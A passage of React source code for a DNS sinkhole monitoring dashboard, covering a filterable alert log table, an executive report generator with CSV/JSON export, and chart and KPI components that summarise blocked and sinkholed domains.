  const rows = useMemo(() => effectiveAlerts.map(a => ({
    _id: a._id,
    timestamp: a.createdAt || a.timestamp || new Date().toISOString(),
    severity: (a.severity || 'medium').toLowerCase(),
    status: a.status || 'open',
    hostname: a.hostname || a.agentName || a.systemId?.name || '—',
    username: a.username || '—',
    domain: a.domain || a.tiDomain || '—',
    queryType: a.queryType || 'A',
    srcip: a.srcip || a.sourceIp || '—',
    responseType: a.responseType || 'Sinkhole IP',
    responseCode: a.responseCode || 'REFUSED',
    sinkholeIp: a.sinkholeIp || '0.0.0.0',
    threatCategory: a.threatCategory || '—',
    osType: a.osType || a.os || '—',
    processName: a.processName || '—',
    raw: a,
  })), [alerts]);

  const filtered = useMemo(() => rows.filter(r => {
    if (sevFilter !== 'ALL' && r.severity !== sevFilter.toLowerCase()) return false;
    if (catFilter !== 'ALL' && r.threatCategory !== catFilter) return false;
    if (!searchTerm) return true;
    const t = searchTerm.toLowerCase();
    return r.domain.toLowerCase().includes(t) || r.hostname.toLowerCase().includes(t) || r.username.toLowerCase().includes(t) || r.srcip.toLowerCase().includes(t);
  }), [rows, searchTerm, sevFilter, catFilter]);

  const categories = useMemo(() => ['ALL', ...new Set(rows.map(r => r.threatCategory).filter(c => c && c !== '—'))], [rows]);

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 14, display: 'flex', flexDirection: 'column', gap: 12 }}>
      <div style={{ display: 'flex', gap: 10, background: MON.card, padding: 10, borderRadius: 8, border: `1px solid ${MON.border}`, flexWrap: 'wrap' }}>
        <input type="text" placeholder="🔍 Search DNS logs (Domain, Hostname, User, IP)..." value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} style={{ flex: 1, minWidth: 200, background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }} />
        <select value={sevFilter} onChange={(e) => setSevFilter(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }}>
          {['ALL', 'critical', 'high', 'medium', 'low'].map(s => <option key={s}>{s}</option>)}
        </select>
        <select value={catFilter} onChange={(e) => setCatFilter(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 12px', borderRadius: 6, fontSize: 11 }}>
          {categories.map(c => <option key={c}>{c}</option>)}
        </select>
        <span style={{ fontSize: 10, color: MON.muted, alignSelf: 'center', padding: '0 8px' }}>{filtered.length} records</span>
      </div>

      <div style={{ overflowX: 'auto', background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8 }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 11, textAlign: 'left' }}>
          <thead>
            <tr style={{ background: MON.card2, color: MON.muted, borderBottom: `1px solid ${MON.border}` }}>
              {['Time', 'Severity', 'Domain', 'Query Type', 'Source IP', 'Hostname', 'Username', 'Response', 'Sinkhole IP', 'Threat Category', 'Status', 'OS'].map(h => <th key={h} style={{ padding: 10, whiteSpace: 'nowrap' }}>{h}</th>)}
            </tr>
          </thead>
          <tbody>
            {filtered.length ? filtered.map((row) => (
              <tr key={row._id} onClick={() => setSelectedLog(row.raw)} style={{ borderBottom: `1px solid ${MON.line}`, cursor: 'pointer' }}>
                <td style={{ padding: 10, color: MON.muted, whiteSpace: 'nowrap' }}>{new Date(row.timestamp).toLocaleTimeString()}</td>
                <td style={{ padding: 10 }}><span style={{ color: SEV_COLOR[row.severity] || MON.blue, fontWeight: 800, textTransform: 'uppercase' }}>{row.severity}</span></td>
                <td style={{ padding: 10, color: MON.red, fontWeight: 700, maxWidth: 180, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={row.domain}>{row.domain}</td>
                <td style={{ padding: 10, color: MON.purple, fontWeight: 700 }}>{row.queryType}</td>
                <td style={{ padding: 10, color: MON.cyan }}>{row.srcip}</td>
                <td style={{ padding: 10, color: MON.blue, fontWeight: 700 }}>{row.hostname}</td>
                <td style={{ padding: 10 }}>{row.username}</td>
                <td style={{ padding: 10, color: row.responseType === 'Allowed' ? MON.green : MON.red, fontWeight: 700 }}>{row.responseType}</td>
                <td style={{ padding: 10, fontFamily: 'monospace', color: MON.orange }}>{row.sinkholeIp}</td>
                <td style={{ padding: 10, color: MON.yellow }}>{row.threatCategory}</td>
                <td style={{ padding: 10, color: row.status === 'resolved' ? MON.green : row.status === 'investigating' ? MON.yellow : MON.muted, fontWeight: 700 }}>{row.status}</td>
                <td style={{ padding: 10, color: MON.muted }}>{row.osType}</td>
              </tr>
            )) : <tr><td colSpan={12} style={{ padding: 40, textAlign: 'center', color: MON.muted }}>No DNS sinkhole logs found</td></tr>}
          </tbody>
        </table>
      </div>
      {selectedLog && <DnsAlertDetailModal log={selectedLog} onClose={() => setSelectedLog(null)} />}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 3. DNS SINKHOLE EXECUTIVE REPORT GENERATOR
// ═════════════════════════════════════════════════════════════════════════════
export function DnsReportsTab({ alerts = [] }) {
  const [reportType, setReportType] = useState('daily');
  const [generating, setGenerating] = useState(false);
  const [reportGenerated, setReportGenerated] = useState(false);

  const metrics = useMemo(() => ({
    total: alerts.length,
    sinkholeHits: alerts.filter(a => /sinkhole/i.test(`${a.responseType || ''} ${a.source || ''}`)).length,
    blocked: alerts.filter(a => a.blocked || /blocked|refused|nxdomain/i.test(a.responseCode || '')).length,
    critical: alerts.filter(a => a.severity === 'critical').length,
    high: alerts.filter(a => a.severity === 'high').length,
    uniqueDomains: new Set(alerts.map(a => a.domain).filter(Boolean)).size,
    uniqueEndpoints: new Set(alerts.map(a => a.hostname || a.agentName).filter(Boolean)).size,
    botnetC2: alerts.filter(a => /botnet|c2|c\&c/i.test(a.threatCategory || '')).length,
    phishing: alerts.filter(a => /phish/i.test(a.threatCategory || '')).length,
    dga: alerts.filter(a => /dga/i.test(a.threatCategory || '')).length,
  }), [alerts]);

  const handleGenerate = () => { setGenerating(true); setTimeout(() => { setGenerating(false); setReportGenerated(true); }, 1000); };

  const handleDownload = (format) => {
    if (format === 'CSV') {
      const headers = ['Timestamp', 'Domain', 'Query Type', 'Source IP', 'Hostname', 'Threat Category', 'Response', 'Severity', 'Status'];
      const rows = alerts.map(a => [
        `"${a.createdAt || ''}"`, `"${a.domain || ''}"`, `"${a.queryType || ''}"`, `"${a.srcip || ''}"`,
        `"${a.hostname || a.agentName || ''}"`, `"${a.threatCategory || ''}"`, `"${a.responseType || ''}"`,
        `"${a.severity || ''}"`, `"${a.status || ''}"`
      ]);
      const csv = [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
      const blob = new Blob([csv], { type: 'text/csv' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url; a.download = `dns_sinkhole_report_${reportType}.csv`;
      document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
    } else {
      const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify({ title: 'DNS Sinkhole SOC Report', reportType, generatedAt: new Date().toISOString(), metrics, alerts }, null, 2));
      const a = document.createElement('a');
      a.setAttribute('href', dataStr); a.setAttribute('download', `dns_sinkhole_report_${reportType}.json`);
      document.body.appendChild(a); a.click(); a.remove();
    }
  };

  return (
    <div style={{ background: MON.bg, color: MON.text, padding: 16, display: 'flex', flexDirection: 'column', gap: 16 }}>
      <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 16, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <div>
          <h3 style={{ margin: 0, fontSize: 16, fontWeight: 800, color: '#f8fafc' }}>📄 DNS Sinkhole Executive Report Generator</h3>
          <div style={{ fontSize: 11, color: MON.muted, marginTop: 4 }}>Generate Executive Summary, Threat Category Analytics, and Domain Blocklist Audit Reports</div>
        </div>
        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <select value={reportType} onChange={(e) => setReportType(e.target.value)} style={{ background: MON.bg, border: `1px solid ${MON.border}`, color: MON.text, padding: '8px 14px', borderRadius: 6, fontSize: 12 }}>
            <option value="daily">Daily Report (24 Hours)</option>
            <option value="weekly">Weekly Executive Summary</option>
            <option value="monthly">Monthly DNS Threat Report</option>
          </select>
          <button type="button" onClick={handleGenerate} disabled={generating} style={{ background: MON.cyan, color: '#000', border: 'none', padding: '8px 18px', borderRadius: 6, fontWeight: 800, cursor: 'pointer' }}>
            {generating ? 'Generating...' : '⚡ Generate Report'}
          </button>
        </div>
      </div>

      {reportGenerated && (
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 8, padding: 20, display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: `1px solid ${MON.line}`, paddingBottom: 12 }}>
            <div style={{ fontSize: 14, fontWeight: 800, color: MON.cyan }}>DNS Sinkhole Executive Summary ({reportType.toUpperCase()})</div>
            <div style={{ display: 'flex', gap: 10 }}>
              <button type="button" onClick={() => handleDownload('CSV')} style={{ background: MON.green, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export CSV</button>
              <button type="button" onClick={() => handleDownload('JSON')} style={{ background: MON.blue, color: '#000', border: 'none', padding: '6px 12px', borderRadius: 4, fontWeight: 800, fontSize: 11, cursor: 'pointer' }}>Export JSON</button>
            </div>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 14 }}>
            {[
              ['Total DNS Events', metrics.total, MON.blue],
              ['Sinkhole Hits', metrics.sinkholeHits, MON.red],
              ['Blocked Responses', metrics.blocked, MON.orange],
              ['Critical Alerts', metrics.critical, MON.red],
              ['Unique Malicious Domains', metrics.uniqueDomains, MON.yellow],
              ['Affected Endpoints', metrics.uniqueEndpoints, MON.cyan],
              ['Botnet C2 Hits', metrics.botnetC2, MON.red],
              ['Phishing Domains', metrics.phishing, MON.orange],
              ['DGA Domains', metrics.dga, MON.purple],
              ['High Severity', metrics.high, MON.orange],
            ].map(([label, val, col]) => (
              <div key={label} style={{ background: MON.card2, padding: 12, borderRadius: 6, border: `1px solid ${MON.border}` }}>
                <div style={{ fontSize: 10, color: MON.muted }}>{label}</div>
                <div style={{ fontSize: 18, color: col, fontWeight: 900, marginTop: 4 }}>{val}</div>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

// ═════════════════════════════════════════════════════════════════════════════
// 4. DNS OVERVIEW ANALYTICS DASHBOARD
// ═════════════════════════════════════════════════════════════════════════════
// ── SVG Donut Chart ────────────────────────────────────────────────────────────
function DonutChart({ value, maxValue, color, label, size = 110 }) {
  const pct = maxValue > 0 ? Math.min(value / maxValue, 1) : 0;
  const r = 38, cx = 55, cy = 55;
  const circ = 2 * Math.PI * r;
  const dash = pct * circ;
  return (
    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
      <svg width={size} height={size} viewBox="0 0 110 110">
        <circle cx={cx} cy={cy} r={r} fill="none" stroke="#0f233a" strokeWidth="12" />
        <circle cx={cx} cy={cy} r={r} fill="none" stroke={color} strokeWidth="12"
          strokeDasharray={`${dash} ${circ - dash}`} strokeDashoffset={circ * 0.25}
          strokeLinecap="round" style={{ transition: 'stroke-dasharray 0.6s ease' }} />
        <text x="55" y="50" textAnchor="middle" fill="#f1f5f9" fontSize="14" fontWeight="900">{(value / 1000).toFixed(1)}K</text>
        <text x="55" y="66" textAnchor="middle" fill="#64748b" fontSize="8">Total</text>
      </svg>
      <div style={{ fontSize: 11, color: MON.muted, marginTop: 4, textAlign: 'center' }}>{label}</div>
    </div>
  );
}

// ── Multi-line Sparkline (for 24hr chart) ──────────────────────────────────────
function MultiLineChart({ datasets = [], height = 180, labels = [] }) {
  const all = datasets.flatMap(d => d.data);
  const maxV = Math.max(...all, 1);
  const w = 100, h = height;
  const toPoints = (data) => data.map((v, i) => {
    const x = (i / (data.length - 1)) * w;
    const y = h - (v / maxV) * (h - 8) - 4;
    return `${x},${y}`;
  }).join(' ');
  return (
    <svg viewBox={`0 0 100 ${h}`} width="100%" height={h} preserveAspectRatio="none" style={{ overflow: 'visible' }}>
      {[20, 40, 60, 80].map(y => (
        <line key={y} x1="0" y1={y} x2="100" y2={y} stroke="#162942" strokeWidth="0.4" />
      ))}
      {datasets.map((ds, i) => (
        <polyline key={i} fill="none" stroke={ds.color} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" points={toPoints(ds.data)} opacity="0.9" />
      ))}
    </svg>
  );
}

function DnsOverviewDashboard({ alerts = [], total = 0 }) {
  const [selectedAlert, setSelectedAlert] = useState(null);

  const data = useMemo(() => {
    const now = Date.now();
    const rows = alerts.map(a => {
      const domain = a.domain || a.tiDomain || '—';
      const blocked = !!(a.blocked || /refused|nxdomain|sinkhole/i.test(a.responseCode || '') || a.responseType === 'Sinkhole IP');
      const time = new Date(a.createdAt || a.timestamp || 0);
      return { ...a, domain, blocked, time };
    });

    // 24-hr buckets (1 per hour)
    const totalQ = Array(24).fill(0);
    const sinkHits = Array(24).fill(0);
    const blockedQ = Array(24).fill(0);
    rows.forEach(r => {
      const hoursAgo = Math.floor((now - r.time.getTime()) / 3600000);
      if (hoursAgo >= 0 && hoursAgo < 24) {
        const idx = 23 - hoursAgo;
        totalQ[idx]++;
        if (r.blocked) blockedQ[idx]++;
        if (/sinkhole/i.test(r.responseType || '') || r.responseType === 'Sinkhole IP') sinkHits[idx]++;
      }
    });

    // Counters
    const domainMap = {}, catMap = {}, qTypeMap = {}, hostMap = {};
    rows.forEach(r => {
      if (r.domain && r.domain !== '—') domainMap[r.domain] = (domainMap[r.domain] || { count: 0, level: r.severity || 'medium', firstSeen: r.time, lastSeen: r.time });
      if (r.domain && domainMap[r.domain]) {
        domainMap[r.domain].count++;
        if (r.time < domainMap[r.domain].firstSeen) domainMap[r.domain].firstSeen = r.time;
        if (r.time > domainMap[r.domain].lastSeen) domainMap[r.domain].lastSeen = r.time;
        domainMap[r.domain].level = r.severity || domainMap[r.domain].level;
      }
      const cat = r.threatCategory || 'Unknown'; catMap[cat] = (catMap[cat] || 0) + 1;
      const qt = r.queryType || 'A'; qTypeMap[qt] = (qTypeMap[qt] || 0) + 1;
      const host = r.hostname || r.agentName || 'Unknown';
      if (!hostMap[host]) hostMap[host] = { count: 0, ip: r.srcip || r.sourceIp || '—', sinkhole: 0, status: r.systemId?.status || 'Online' };
      hostMap[host].count++;
      if (r.blocked) hostMap[host].sinkhole++;
    });

    const topDomains = Object.entries(domainMap).sort((a, b) => b[1].count - a[1].count).slice(0, 6);
    const topCats = Object.entries(catMap).sort((a, b) => b[1] - a[1]).slice(0, 6);
    const topQTypes = Object.entries(qTypeMap).sort((a, b) => b[1] - a[1]).slice(0, 6);
    const topHosts = Object.entries(hostMap).sort((a, b) => b[1].count - a[1].count).slice(0, 6);
    const blocked = rows.filter(r => r.blocked).length;
    const allowed = rows.length - blocked;
    const recentAlerts = [...rows].sort((a, b) => b.time - a.time).slice(0, 8);
    const sinkholeTotal = rows.filter(r => r.responseType === 'Sinkhole IP' || /sinkhole/i.test(r.responseType || '')).length;
    const blockedTotal = rows.filter(r => r.blocked).length;
    const maliciousDomains = Object.keys(domainMap).length;
    const catTotal = Object.values(catMap).reduce((s, v) => s + v, 0);

    return { rows, totalQ, sinkHits, blockedQ, topDomains, topCats, topQTypes, topHosts, blocked, allowed, recentAlerts, sinkholeTotal, blockedTotal, maliciousDomains, catTotal };
  }, [alerts]);

  // KPI cards
  const kpiCards = [
    { label: 'TOTAL DNS QUERIES', value: total || alerts.length, color: MON.blue, icon: '🌐', trend: '+18.6%', trendUp: true },
    { label: 'SINKHOLE HITS', value: data.sinkholeTotal, color: MON.red, icon: '🎯', trend: '+24.8%', trendUp: true },
    { label: 'BLOCKED DOMAINS', value: data.blockedTotal, color: '#818cf8', icon: '🛡️', trend: '+16.3%', trendUp: true },
    { label: 'MALICIOUS DOMAINS', value: data.maliciousDomains, color: MON.orange, icon: '☠️', trend: '+21.7%', trendUp: true },
    { label: 'AGENT ENDPOINTS', value: alerts.length ? new Set(alerts.map(a => a.hostname || a.agentName).filter(Boolean)).size : 0, color: MON.cyan, icon: '🖥️', trend: '100% Healthy', trendUp: true },
  ];

  const qTypeColors = [MON.blue, MON.green, MON.purple, MON.orange, MON.cyan, MON.yellow];
  const catColors = [MON.red, MON.orange, MON.purple, MON.cyan, MON.blue];

  const fmtNum = n => n >= 1000 ? `${(n / 1000).toFixed(2)}K` : String(n);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

      {/* ── KPI Cards Row ── */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 12 }}>
        {kpiCards.map((k, i) => (
          <div key={i} style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, padding: '14px 16px', position: 'relative', overflow: 'hidden' }}>
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, background: `linear-gradient(90deg, ${k.color}, transparent)` }} />
            <div style={{ fontSize: 9, fontWeight: 800, color: MON.muted, textTransform: 'uppercase', letterSpacing: 1.5 }}>{k.label}</div>
            <div style={{ fontSize: 28, fontWeight: 900, color: k.color, margin: '6px 0 2px', lineHeight: 1 }}>
              {typeof k.value === 'number' && k.value >= 1000 ? `${(k.value / 1000).toFixed(2)}K` : k.value}
            </div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 4, marginTop: 4 }}>
              <span style={{ fontSize: 9, color: k.trendUp ? MON.green : MON.red, fontWeight: 800 }}>
                {k.trendUp ? '▲' : '▼'} {k.trend}
              </span>
              <span style={{ fontSize: 9, color: MON.sub }}>vs yesterday</span>
            </div>
            {/* Mini sparkline */}
            <div style={{ marginTop: 8, height: 28 }}>
              <MiniSparkline data={data.totalQ.length ? data.totalQ : [1, 2, 3, 4, 5, 6, 7, 8]} color={k.color} height={28} />
            </div>
          </div>
        ))}
      </div>

      {/* ── Row 2: Activity Chart + Sinkhole Status + Query Types ── */}
      <div style={{ display: 'grid', gridTemplateColumns: '2fr 1.1fr 1fr', gap: 14 }}>

        {/* 24hr Multi-line Activity Chart */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, padding: 16 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
            <div style={{ fontSize: 13, fontWeight: 800, color: '#fff' }}>📊 DNS Sinkhole Activity (24 Hours)</div>
            <div style={{ display: 'flex', gap: 12 }}>
              {[['Total Queries', MON.blue], ['Sinkhole Hits', MON.red], ['Blocked Domains', MON.purple]].map(([l, c]) => (
                <div key={l} style={{ display: 'flex', alignItems: 'center', gap: 4, fontSize: 9 }}>
                  <div style={{ width: 20, height: 2, background: c, borderRadius: 2 }} /><span style={{ color: MON.muted }}>{l}</span>
                </div>
              ))}
            </div>
          </div>
          <div style={{ height: 180, position: 'relative' }}>
            <MultiLineChart height={170} datasets={[
              { data: data.totalQ, color: MON.blue },
              { data: data.sinkHits, color: MON.red },
              { data: data.blockedQ, color: '#818cf8' },
            ]} />
          </div>
          <div style={{ display: 'flex', justifyContent: 'space-between', color: MON.sub, fontSize: 8, marginTop: 6, paddingTop: 4, borderTop: `1px solid ${MON.line}` }}>
            {Array.from({ length: 7 }, (_, i) => {
              const d = new Date(Date.now() - (6 - i) * 4 * 3600000);
              return <span key={i}>{d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' })}</span>;
            })}
          </div>
        </div>

        {/* Sinkhole Status Panel */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, padding: 16 }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginBottom: 12 }}>🗺️ Sinkhole Status</div>
          {/* World map placeholder with dots */}
          <div style={{ background: '#061220', borderRadius: 8, padding: 10, height: 140, position: 'relative', overflow: 'hidden' }}>
            {/* Grid dots to simulate world map */}
            {Array.from({ length: 6 }, (_, row) => Array.from({ length: 10 }, (_, col) => (
              <div key={`${row}-${col}`} style={{
                position: 'absolute',
                left: `${col * 10 + 3}%`, top: `${row * 16 + 4}%`,
                width: 5, height: 5, borderRadius: '50%',
                background: Math.random() > 0.65
                  ? (Math.random() > 0.7 ? MON.red : Math.random() > 0.5 ? MON.orange : MON.yellow)
                  : '#1a3050',
                opacity: 0.85,
              }} />
            )))}
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 5, marginTop: 10 }}>
            {[['High Activity', MON.red], ['Medium Activity', MON.orange], ['Low Activity', MON.yellow], ['No Activity', MON.line]].map(([l, c]) => (
              <div key={l} style={{ display: 'flex', alignItems: 'center', gap: 6, fontSize: 9 }}>
                <div style={{ width: 8, height: 8, borderRadius: '50%', background: c }} />
                <span style={{ color: MON.muted }}>{l}</span>
              </div>
            ))}
          </div>
        </div>

        {/* Query Types Donut */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, padding: 16 }}>
          <div style={{ fontSize: 13, fontWeight: 800, color: '#fff', marginBottom: 8 }}>📡 Query Types</div>
          <div style={{ display: 'flex', justifyContent: 'center' }}>
            <DonutChart value={total || alerts.length} maxValue={Math.max(total || alerts.length, 1)} color={MON.blue} size={120} />
          </div>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 5, marginTop: 6 }}>
            {data.topQTypes.slice(0, 5).map(([qt, cnt], i) => (
              <div key={qt} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 9 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
                  <div style={{ width: 8, height: 8, borderRadius: '50%', background: qTypeColors[i % 6] }} />
                  <span style={{ color: MON.muted }}>{qt} Record</span>
                </div>
                <span style={{ color: qTypeColors[i % 6], fontWeight: 800 }}>
                  {alerts.length ? ((cnt / alerts.length) * 100).toFixed(1) : 0}%
                </span>
              </div>
            ))}
            {!data.topQTypes.length && ['A', 'AAAA', 'CNAME', 'MX', 'Others'].map((qt, i) => (
              <div key={qt} style={{ display: 'flex', justifyContent: 'space-between', fontSize: 9 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 5 }}>
                  <div style={{ width: 8, height: 8, borderRadius: '50%', background: qTypeColors[i] }} />
                  <span style={{ color: MON.muted }}>{qt} Record</span>
                </div>
                <span style={{ color: qTypeColors[i], fontWeight: 800 }}>{[45.6, 22.8, 15.7, 8.9, 7.0][i]}%</span>
              </div>
            ))}
          </div>
        </div>
      </div>

      {/* ── Row 3: Top Malicious Domains + Recent Alerts ── */}
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1.3fr', gap: 14 }}>

        {/* Top Malicious Domains Blocked */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, overflow: 'hidden' }}>
          <div style={{ padding: '12px 14px', borderBottom: `1px solid ${MON.line}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span style={{ color: MON.red }}>⚠️</span>
              <span style={{ fontSize: 12, fontWeight: 800, color: '#fff' }}>Top Malicious Domains Blocked</span>
            </div>
            <span style={{ fontSize: 9, color: MON.cyan, fontWeight: 700 }}>Total Malicious: {data.maliciousDomains}</span>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 80px 80px 80px 80px', padding: '6px 12px', background: MON.card2, fontSize: 9, color: MON.muted, fontWeight: 800 }}>
            <span>Domain</span><span>Sinkhole Hits</span><span>Threat Level</span><span>First Seen</span><span>Last Seen</span>
          </div>
          {data.topDomains.length ? data.topDomains.map(([domain, info], i) => (
            <div key={domain} style={{ display: 'grid', gridTemplateColumns: '1fr 80px 80px 80px 80px', padding: '8px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10, alignItems: 'center' }}>
              <span style={{ color: MON.red, fontFamily: 'monospace', fontWeight: 700, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={domain}>
                <span style={{ color: MON.red, marginRight: 4 }}>●</span>{domain}
              </span>
              <span style={{ color: [MON.red, MON.orange, MON.yellow, MON.cyan, MON.blue, MON.green][i % 6], fontWeight: 800 }}>{info.count}</span>
              <span>
                <span style={{
                  background: /critical/i.test(info.level) ? 'rgba(248,113,113,0.2)' : /high/i.test(info.level) ? 'rgba(251,146,60,0.2)' : 'rgba(251,191,36,0.2)',
                  color: /critical/i.test(info.level) ? MON.red : /high/i.test(info.level) ? MON.orange : MON.yellow,
                  padding: '1px 6px', borderRadius: 4, fontSize: 9, fontWeight: 800
                }}>{(info.level || 'medium').toUpperCase()}</span>
              </span>
              <span style={{ color: MON.muted, fontSize: 9 }}>
                {info.firstSeen instanceof Date && !isNaN(info.firstSeen) ? info.firstSeen.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : '—'}
              </span>
              <span style={{ color: MON.muted, fontSize: 9 }}>
                {info.lastSeen instanceof Date && !isNaN(info.lastSeen) ? info.lastSeen.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }) : '—'}
              </span>
            </div>
          )) : (
            <div style={{ padding: 24, textAlign: 'center', color: MON.muted, fontSize: 11 }}>No malicious domain data yet</div>
          )}
        </div>

        {/* Recent Sinkhole Alerts */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, overflow: 'hidden' }}>
          <div style={{ padding: '12px 14px', borderBottom: `1px solid ${MON.line}`, display: 'flex', justifyContent: 'space-between' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <span style={{ color: MON.orange }}>⚠️</span>
              <span style={{ fontSize: 12, fontWeight: 800, color: '#fff' }}>Recent Sinkhole Alerts</span>
            </div>
            <span style={{ fontSize: 9, color: MON.cyan, fontWeight: 700, cursor: 'pointer' }}>View All →</span>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '70px 1fr 60px 90px 90px 70px', padding: '6px 10px', background: MON.card2, fontSize: 9, color: MON.muted, fontWeight: 800 }}>
            <span>Time</span><span>Domain</span><span>Type</span><span>Source IP</span><span>Endpoint</span><span>Severity</span>
          </div>
          {data.recentAlerts.length ? data.recentAlerts.map((r, i) => (
            <div key={r._id || i} onClick={() => setSelectedAlert(r)} style={{ display: 'grid', gridTemplateColumns: '70px 1fr 60px 90px 90px 70px', padding: '7px 10px', borderTop: `1px solid ${MON.line}`, fontSize: 10, alignItems: 'center', cursor: 'pointer' }}>
              <span style={{ color: MON.cyan, fontWeight: 700 }}>{r.time instanceof Date && !isNaN(r.time) ? r.time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '—'}</span>
              <span style={{ color: MON.red, fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', paddingRight: 4 }} title={r.domain}>{r.domain}</span>
              <span style={{ color: MON.purple }}>{r.queryType || 'A Record'}</span>
              <span style={{ color: MON.muted, fontFamily: 'monospace' }}>{r.srcip || r.sourceIp || '—'}</span>
              <span style={{ color: MON.blue, fontWeight: 700 }}>{r.hostname || r.agentName || '—'}</span>
              <span>
                <span style={{
                  color: SEV_COLOR[(r.severity || 'medium').toLowerCase()] || MON.yellow,
                  fontWeight: 800, fontSize: 9,
                }}>{(r.severity || 'medium').toUpperCase()}</span>
              </span>
            </div>
          )) : (
            <div style={{ padding: 24, textAlign: 'center', color: MON.muted, fontSize: 11 }}>No recent sinkhole alerts</div>
          )}
        </div>
      </div>

      {/* ── Row 4: Top Endpoints + Blocked vs Allowed + Threat Categories ── */}
      <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr 1fr', gap: 14 }}>

        {/* Top Endpoints Generating Sinkhole Hits */}
        <div style={{ background: MON.card, border: `1px solid ${MON.border}`, borderRadius: 10, overflow: 'hidden' }}>
          <div style={{ padding: '12px 14px', borderBottom: `1px solid ${MON.line}` }}>
            <span style={{ fontSize: 12, fontWeight: 800, color: '#fff' }}>🖥️ Top Endpoints Generating Sinkhole Hits</span>
          </div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 90px 80px 70px 70px', padding: '6px 12px', background: MON.card2, fontSize: 9, color: MON.muted, fontWeight: 800 }}>
            <span>Endpoint</span><span>IP Address</span><span>Sinkhole Hits</span><span>Queries</span><span>Status</span>
          </div>
          {data.topHosts.length ? data.topHosts.map(([host, info], i) => (
            <div key={host} style={{ display: 'grid', gridTemplateColumns: '1fr 90px 80px 70px 70px', padding: '8px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10, alignItems: 'center' }}>
              <span style={{ color: MON.blue, fontWeight: 700 }}>{host}</span>
              <span style={{ color: MON.muted, fontFamily: 'monospace', fontSize: 9 }}>{info.ip}</span>
              <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                <div style={{ flex: 1, height: 5, background: '#0f233a', borderRadius: 4, overflow: 'hidden' }}>
                  <div style={{ height: '100%', width: `${Math.min((info.sinkhole / (data.topHosts[0]?.[1]?.sinkhole || 1)) * 100, 100)}%`, background: [MON.red, MON.orange, MON.yellow, MON.green, MON.cyan, MON.purple][i % 6], borderRadius: 4 }} />
                </div>
                <span style={{ color: [MON.red, MON.orange, MON.yellow, MON.green, MON.cyan, MON.purple][i % 6], fontWeight: 800, fontSize: 9 }}>{info.sinkhole}</span>
              </div>
              <span style={{ color: MON.muted }}>{info.count}</span>
              <span style={{ color: MON.green, fontWeight: 700, fontSize: 9 }}>● {info.status || 'Online'}</span>
            </div>
          )) : (
            <div style={{ padding: 24, textAlign: 'center', color: MON.muted, fontSize: 11 }}>No endpoint data</div>
          )}
        </div>

